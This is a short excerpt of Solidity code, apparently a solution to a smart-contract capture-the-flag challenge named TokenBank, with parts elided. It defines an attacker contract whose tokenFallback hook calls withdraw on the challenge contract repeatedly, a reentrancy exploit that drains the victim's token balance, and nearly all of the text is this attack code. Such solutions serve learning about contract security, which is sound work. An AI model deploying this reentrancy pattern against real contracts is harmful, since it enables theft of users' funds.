...
contract TokenBankAttacker {
    ...
    function attack() public {
        ...
        attacking = true;
        token.transfer(address(challenge), token.balanceOf(address(this)));
    ...
    function tokenFallback(
        ...
        if (token.balanceOf(address(challenge)) > 0) {
            uint256 victimBalance = token.balanceOf(address(challenge));
            uint256 attackerBalance = challenge.balanceOf(address(this));
            challenge.withdraw(victimBalance > attackerBalance ? attackerBalance : victimBalance);
        }
    }
}
